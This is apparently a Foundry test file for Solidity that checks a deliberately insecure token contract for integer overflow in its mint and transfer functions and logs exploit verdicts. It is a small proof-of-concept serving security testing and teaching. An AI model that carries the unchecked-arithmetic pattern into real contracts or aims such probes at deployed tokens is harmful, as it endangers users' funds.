// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/insecure_transfer.sol";

contract IntegerOverflowAddTest is Test {
    IntegerOverflowAdd token;
    address owner = makeAddr("owner");
    address user = makeAddr("user");

    function setUp() public {
        vm.prank(owner);
        token = new IntegerOverflowAdd();
    }

    function test_mintOverflow() public {
        uint256 maxUint = type(uint256).max;
        
        console.log("--- FIRST MINT Operation ---");
        vm.prank(owner);
        token.mint(user, maxUint);
        assertEq(token.getBalance(user), maxUint);

        console.log("----- BEFORE-SecondMint Overflow Trigger -----");
        uint256 preBalance = token.getBalance(user);
        uint256 preTotalSupply = token.totalSupply();
        console.log("User balance before trigger:", preBalance);
        console.log("Total supply before trigger:", preTotalSupply);
        
        console.log("--- TRIGGER: Call mint() causing overflow ---");
        vm.prank(owner);
        token.mint(user, 1);
        
        console.log("----- AFTER-SecondMint Overflow Trigger -----");
        uint256 postBalance = token.getBalance(user);
        uint256 postTotalSupply = token.totalSupply();
        console.log("User balance after trigger:", postBalance);
        console.log("Total supply after trigger:", postTotalSupply);
        
        bool overflowOccurred = (preBalance == maxUint) && 
                                (postBalance == 0) && 
                                (preTotalSupply == maxUint) && 
                                (postTotalSupply == 0);
        
        if (overflowOccurred) {
            console.log("VERDICT: Exploit succeeded - overflow caused balance/totalSupply wrap around");
            console.log("Vulnerability Exists: Integer overflow in mint function");
        } else {
            console.log("VERDICT: Exploit failed - state unchanged from expected overflow behavior");
            console.log("Vulnerability not Exist: No overflow detected in mint operation");
        }
    }

    function test_transferOverflow() public {
        address sender = makeAddr("sender");
        address receiver = makeAddr("receiver");
        
        console.log("--- Setup Balances ---");
        vm.prank(owner);
        token.mint(receiver, type(uint256).max - 1); 
        
        vm.prank(owner);
        token.mint(sender, 2);

        console.log("----- BEFORE-Transfer Overflow Trigger -----");
        uint256 preSenderBalance = token.getBalance(sender);
        uint256 preReceiverBalance = token.getBalance(receiver);
        uint256 preTotalSupply = token.totalSupply();
        console.log("Sender balance before trigger:", preSenderBalance);
        console.log("Receiver balance before trigger:", preReceiverBalance);
        console.log("Total supply before trigger:", preTotalSupply);
        
        console.log("--- TRIGGER: Call transfer() causing overflow ---");
        vm.prank(sender);
        token.transfer(receiver, 2);
        
        console.log("----- AFTER-Transfer Overflow Trigger -----");
        uint256 postSenderBalance = token.getBalance(sender);
        uint256 postReceiverBalance = token.getBalance(receiver);
        uint256 postTotalSupply = token.totalSupply();
        console.log("Sender balance after trigger:", postSenderBalance);
        console.log("Receiver balance after trigger:", postReceiverBalance);
        console.log("Total supply after trigger:", postTotalSupply);
        
        bool overflowOccurred = (preReceiverBalance == type(uint256).max - 1) && 
                                (preSenderBalance == 2) && 
                                (postReceiverBalance == 0) && 
                                (postSenderBalance == 0) &&
                                (preTotalSupply == 0) &&    // Due to overflow from initial mint
                                (postTotalSupply == 0);
        
        if (overflowOccurred) {
            console.log("VERDICT: Exploit succeeded - balances wrapped around to zero");
            console.log("Vulnerability Exists: Integer overflow in transfer function");
        } else {
            console.log("VERDICT: Exploit failed - balances unchanged from overflow expectations");
            console.log("Vulnerability not Exist: No overflow detected in transfer operation");
        }
    }
}